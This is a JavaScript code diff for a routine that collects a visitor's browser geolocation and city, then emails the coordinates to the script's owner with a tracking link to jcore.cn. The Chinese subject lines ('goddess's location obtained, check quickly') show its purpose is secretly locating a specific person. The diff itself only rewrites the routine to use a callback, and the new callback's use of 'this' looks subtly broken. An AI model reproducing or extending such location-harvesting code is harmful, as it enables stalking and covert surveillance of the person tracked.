@@ -16,17 +16,18 @@
         {
             this.repeat = true;
             if(this.repeat){ //防止重复点击
-                var mail = this.gps();
-                if(mail.isSuccess){
-                    this.sendMail({ subject : mail.subject, html : mail.html });
-                    this.repeat = false;
-                }else{
-                    this.repeat = false;
-                }
+               this.gps(function(mail){
+                   if(mail.isSuccess){
+                       this.sendMail({ subject : mail.subject, html : mail.html });
+                       this.repeat = false;
+                   }else{
+                       this.repeat = false;
+                   }
+               });
             }
         },
         //获取gps经度纬度坐标
-        gps: function()
+        gps: function(callfun)
         {
             if(navigator.geolocation)
             {
@@ -44,11 +45,11 @@
                             address =  "(" + (_a.country + _a.province + _a.city) + ")";
                         }
                         message = ( "lat=" + lat + "&lon=" + lon );
-                        return {
+                        callfun({
                             isSuccess : true,
                             subject : "女神地址获取成功，速速查看^0^...",
                             html : "<a href=\"http://jcore.cn/z.html?\" "+message+" target=\"_blank\" >戳我..."+ address +"</a>"
-                        }
+                        });
                     },
                     function (error)
                     {
@@ -59,11 +60,11 @@
                             3: '超时（多访问几次，或者过段时间再次尝试）'
                         }
                         message = ('获取数据失败：' + type[error.code]);
-                        return {
+                        callfun({
                             isSuccess : false,
                             subject : "女神地址获取失败，不哭不哭T_T...",
                             html : message
-                        }
+                        });
                     }
                 );
             }
